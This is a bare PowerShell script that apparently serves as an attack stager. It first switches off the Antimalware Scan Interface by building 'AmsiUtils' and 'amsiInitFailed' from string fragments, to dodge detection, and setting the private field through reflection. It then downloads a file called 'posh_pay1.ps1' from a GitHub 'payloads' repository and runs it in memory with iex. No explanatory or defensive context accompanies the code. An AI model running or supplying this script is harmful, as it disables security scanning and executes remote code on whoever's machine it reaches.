$a = 'System.Management.Automation.A';$b = 'ms';$u = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}{1}i{2}' -f $a,$b,$u))
$field = $assembly.GetField(('a{0}iInitFailed' -f $b),'NonPublic,Static')
$field.SetValue($null,$true)

$p=iwr raw.githubusercontent.com/in0d3/payloads/main/posh_pay1.ps1
sleep 3
iex $p.rawcontent
